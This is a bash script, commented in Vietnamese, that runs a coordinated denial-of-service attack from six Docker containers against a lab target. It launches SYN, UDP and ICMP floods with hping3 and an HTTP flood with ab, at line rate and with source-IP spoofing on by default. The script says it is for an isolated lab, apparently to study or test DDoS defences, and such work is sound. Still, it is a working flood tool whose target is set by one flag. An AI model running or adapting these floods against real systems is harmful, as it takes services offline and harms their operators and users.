#!/usr/bin/env bash
# Orchestrator DDoS chuyen dung hping3 va ab - chi dung trong lab co lap.
# Chay ca 6 attacker container dong loat nham victim cua lab.
#
# Cach dung:
#   ./run_ddos.sh syn                         # 6 attacker SYN flood (hping3) 30s
#   ./run_ddos.sh http                        # 6 attacker HTTP flood (ab) 30s
#   ./run_ddos.sh udp                         # 6 attacker UDP flood (hping3) 30s
#   ./run_ddos.sh icmp                        # 6 attacker ICMP echo flood (hping3) 30s
#   ./run_ddos.sh syn -t 172.30.0.10 -d 30    # chon target + thoi luong
#   ./run_ddos.sh syn -r 500                  # co pacing 500 pps/nguon (0 hoac khong truyen = line-rate --flood)
#   ./run_ddos.sh syn --no-spoof              # khong spoof IP (IP that cua tung container)
#
# Ghi chu: neu user chua reload nhom docker trong phien dang nhap, script tu chay
# lai chinh no duoi "sg docker -c ..." (khong can sudo khi da la thanh vien nhom docker).
set -euo pipefail

# --- tu re-exec duoi nhom docker neu khong truy cap duoc daemon ---
if ! docker version >/dev/null 2>&1; then
  if id -nG "$(id -un)" | tr ' ' '\n' | grep -qx docker; then
    exec sg docker -c "$(printf '%q ' "$0" "$@")"
  fi
  echo "[!] Khong truy cap duoc Docker daemon va user khong o nhom 'docker'." >&2
  exit 1
fi

MODE="syn"
TARGET="172.30.0.10"
DURATION=30
PPS=""          # rong = khong truyen --pps -> dung --flood
SPOOF=1
CONCURRENCY=50  # so ket noi dong thoi moi nguon cho ab

# tham so dau tien (neu co) la mode syn|http|udp|icmp
if [[ "${1:-}" == "syn" || "${1:-}" == "http" || "${1:-}" == "udp" || "${1:-}" == "icmp" ]]; then
  MODE="$1"; shift
fi
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)    TARGET="$2"; shift 2 ;;
    -d|--duration)  DURATION="$2"; shift 2 ;;
    -r|--pps)       PPS="$2"; shift 2 ;;
    -c|--concurrency) CONCURRENCY="$2"; shift 2 ;;
    --no-spoof)     SPOOF=0; shift ;;
    syn|http|udp|icmp) MODE="$1"; shift ;;
    *) echo "[!] Tham so khong hop le: $1" >&2; exit 2 ;;
  esac
done

ATTACKERS=(attacker1 attacker2 attacker3 attacker4 attacker5 attacker6)
echo "[*] Bat dau DDoS mode=$MODE (dung hping3/ab) tu ${#ATTACKERS[@]} nguon -> $TARGET trong ${DURATION}s"

pids=()
for a in "${ATTACKERS[@]}"; do
  if [[ "$MODE" == "syn" ]]; then
    cmd=(docker exec "$a" timeout "$DURATION" hping3 -S -p 80 -q)
    [[ "$SPOOF" -eq 1 ]] && cmd+=(--rand-source)
    if [[ -n "$PPS" && "$PPS" -gt 0 ]]; then cmd+=(-i "u$((1000000 / PPS))"); else cmd+=(--flood); fi
    cmd+=("$TARGET")
  elif [[ "$MODE" == "udp" ]]; then
    cmd=(docker exec "$a" timeout "$DURATION" hping3 --udp -p 80 -q)
    [[ "$SPOOF" -eq 1 ]] && cmd+=(--rand-source)
    if [[ -n "$PPS" && "$PPS" -gt 0 ]]; then cmd+=(-i "u$((1000000 / PPS))"); else cmd+=(--flood); fi
    cmd+=("$TARGET")
  elif [[ "$MODE" == "icmp" ]]; then
    cmd=(docker exec "$a" timeout "$DURATION" hping3 --icmp -q)
    [[ "$SPOOF" -eq 1 ]] && cmd+=(--rand-source)
    if [[ -n "$PPS" && "$PPS" -gt 0 ]]; then cmd+=(-i "u$((1000000 / PPS))"); else cmd+=(--flood); fi
    cmd+=("$TARGET")
  elif [[ "$MODE" == "http" ]]; then
    cmd=(docker exec "$a" timeout "$DURATION" ab -k -c "$CONCURRENCY" -t "$DURATION" -n 100000000 "http://$TARGET/")
  fi
  "${cmd[@]}" &
  pids+=($!)
done

echo "[*] Dang ban luu luong... (doi ${DURATION}s)"
wait "${pids[@]}" || true
echo "[*] Hoan tat DDoS."
